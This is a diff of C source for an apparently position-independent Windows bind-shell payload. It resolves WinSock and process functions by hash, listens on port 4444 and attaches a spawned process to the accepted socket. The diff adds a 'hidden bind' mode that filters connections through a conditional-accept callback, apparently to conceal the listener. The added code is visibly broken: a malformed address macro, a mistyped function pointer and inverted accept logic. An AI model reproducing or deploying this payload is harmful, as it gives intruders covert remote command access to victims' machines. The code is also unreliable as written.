@@ -8,6 +8,14 @@
 #include <winsock2.h>
 #include <intrin.h>
 
+// Eventually this will be removed so the project compile using /D  flag or
+// a new confuration like Release - Bind & Release - Hidden
+#define HIDDEN_BIND 
+
+#if defined(HIDDEN_BIND)
+	#define HIDDEN_ADDRESS '1', '9', '2', '.', '1', '6', '8' '.', '0', '.', '2', 0
+#endif
+
 #define BIND_PORT 4444
 #define HTONS(x) ( ( (( (USHORT)(x) ) >> 8 ) & 0xff) | ((( (USHORT)(x) ) & 0xff) << 8) )
 
@@ -18,12 +26,12 @@ typedef HMODULE (WINAPI *FuncLoadLibraryA) (
 	_In_z_	LPTSTR lpFileName
 );
 
-typedef int (WINAPI *FuncWsaStartup) (
+typedef int (WINAPI *FuncWSAStartup) (
 	_In_	WORD wVersionRequested,
 	_Out_	LPWSADATA lpWSAData
 );
 
-typedef SOCKET (WINAPI *FuncWsaSocketA) (
+typedef SOCKET (WINAPI *FuncWSASocketA) (
 	_In_		int af,
 	_In_		int type,
 	_In_		int protocol,
@@ -38,6 +46,14 @@ typedef int (WINAPI *FuncBind) (
 	_In_	int namelen
 );
 
+typedef int (WINAPI *FuncSetSocketOpt) (
+	_In_       SOCKET s,
+	_In_       int    level,
+	_In_       int    optname,
+	_In_ const char   *optval,
+	_In_       int    optlen
+);
+
 typedef int (WINAPI *FuncListen) (
 	_In_	SOCKET s,
 	_In_	int backlog
@@ -47,6 +63,14 @@ typedef SOCKET (WINAPI *FuncAccept) (
 	_In_		SOCKET s,
 	_Out_opt_	struct sockaddr *addr,
 	_Inout_opt_	int *addrlen
+);
+
+typedef SOCKET (WINAPI *FuncWSAAccept) (
+	_In_    SOCKET          s,
+	_Out_   struct sockaddr *addr,
+	_Inout_ LPINT           addrlen,
+	_In_    LPCONDITIONPROC lpfnCondition,
+	_In_    DWORD_PTR       dwCallbackData
 );
 
 typedef int (WINAPI *FuncCloseSocket) (
@@ -71,17 +95,43 @@ typedef DWORD (WINAPI *FuncWaitForSingleObject) (
 	_In_	DWORD dwMilliseconds
 );
 
+int CALLBACK ConditionAcceptFunc( 
+	IN LPWSABUF lpCallerId,
+	IN LPWSABUF lpCallerData,
+	IN OUT LPQOS lpSQOS,
+	IN OUT LPQOS lpGQOS,
+	IN LPWSABUF lpCalleeId,
+	OUT LPWSABUF lpCalleeData,
+	OUT GROUP FAR *g,
+	IN DWORD dwCallbackData
+	)
+	{
+		if(dwCallbackData == HIDDEN_ADDRESS)
+		{
+			return CF_REJECT;
+		}
+		else
+		{
+			return CF_ACCEPT;
+		}
+	};
+
 // Write the logic for the primary payload here
 // Normally, I would call this 'main' but if you call a function 'main', link.exe requires that you link against the CRT
 // Rather, I will pass a linker option of "/ENTRY:ExecutePayload" in order to get around this issue.
 VOID ExecutePayload( VOID )
 {
 	FuncLoadLibraryA MyLoadLibraryA;
-	FuncWsaStartup MyWSAStartup;
-	FuncWsaSocketA MyWSASocketA;
+	FuncWSAStartup MyWSAStartup;
+	FuncWSASocketA MyWSASocketA;
 	FuncBind MyBind;
 	FuncListen MyListen;
+#if defined(HIDDEN_BIND)
+	FuncBind MySetSocketOpt;
+	FuncWSAAccept MyWSAAccept;
+#else
 	FuncAccept MyAccept;
+#endif
 	FuncCloseSocket MyCloseSocket;
 	FuncCreateProcess MyCreateProcessA;
 	FuncWaitForSingleObject MyWaitForSingleObject;
@@ -105,19 +155,24 @@ VOID ExecutePayload( VOID )
 	#pragma warning( push )
 	#pragma warning( disable : 4055 ) // Ignore cast warnings
 	// Should I be validating that these return a valid address? Yes... Meh.
-	MyLoadLibraryA = (FuncLoadLibraryA) GetProcAddressWithHash( 0x0726774C );
+	MyLoadLibraryA = 		(FuncLoadLibraryA) GetProcAddressWithHash( 0x0726774C );
 
 	// You must call LoadLibrary on the winsock module before attempting to resolve its exports.
 	MyLoadLibraryA((LPTSTR) module);
 
-	MyWSAStartup =			(FuncWsaStartup) GetProcAddressWithHash( 0x006B8029 );
-	MyWSASocketA =			(FuncWsaSocketA) GetProcAddressWithHash( 0xE0DF0FEA );
-	MyBind =				(FuncBind) GetProcAddressWithHash( 0x6737DBC2 );
-	MyListen =				(FuncListen) GetProcAddressWithHash( 0xFF38E9B7 );
-	MyAccept =				(FuncAccept) GetProcAddressWithHash( 0xE13BEC74 );
+	MyWSAStartup =			(FuncWSAStartup) GetProcAddressWithHash( 0x006B8029 );
+	MyWSASocketA =			(FuncWSASocketA) GetProcAddressWithHash( 0xE0DF0FEA );
+	MyBind =			(FuncBind) GetProcAddressWithHash( 0x6737DBC2 );
+	MyListen =			(FuncListen) GetProcAddressWithHash( 0xFF38E9B7 );
+#if defined(HIDDEN_BIND)
+	MySetSocketOpt =		(FuncSetSocketOpt) GetProcAddressWithHash( 0x2977A2F1 );
+	MyWSAAccept =			(FuncWSAAccept) GetProcAddressWithHash( 0x33BEAC94 );
+#else
+	MyAccept =			(FuncAccept) GetProcAddressWithHash( 0xE13BEC74 );
+#endif
 	MyCloseSocket =			(FuncCloseSocket) GetProcAddressWithHash( 0x614D6E75 );
 	MyCreateProcessA =		(FuncCreateProcess) GetProcAddressWithHash( 0x863FCC79 );
-	MyWaitForSingleObject =	(FuncWaitForSingleObject) GetProcAddressWithHash( 0x601D8708 );
+	MyWaitForSingleObject =		(FuncWaitForSingleObject) GetProcAddressWithHash( 0x601D8708 );
 	#pragma warning( pop )
 
 	MyWSAStartup( MAKEWORD( 2, 2 ), &WSAData );
@@ -128,8 +183,15 @@ VOID ExecutePayload( VOID )
 	service.sin_port = HTONS( BIND_PORT );
 
 	MyBind( s, (SOCKADDR *) &service, sizeof(service) );
+#if defined(HIDDEN_BIND)
+	MySetSocketOpt( s, SOL_SOCKET, SO_CONDITIONAL_ACCEPT, 1, 1 );
+#endif
 	MyListen( s, 0 );
+#if defined(HIDDEN_BIND)
+	AcceptedSocket = MyWSAAccept( s, NULL, NULL, ConditionAcceptFunc, NULL );
+#else
 	AcceptedSocket = MyAccept( s, NULL, NULL );
+#endif
 	MyCloseSocket( s );
 
 	StartupInfo.hStdError = (HANDLE) AcceptedSocket;
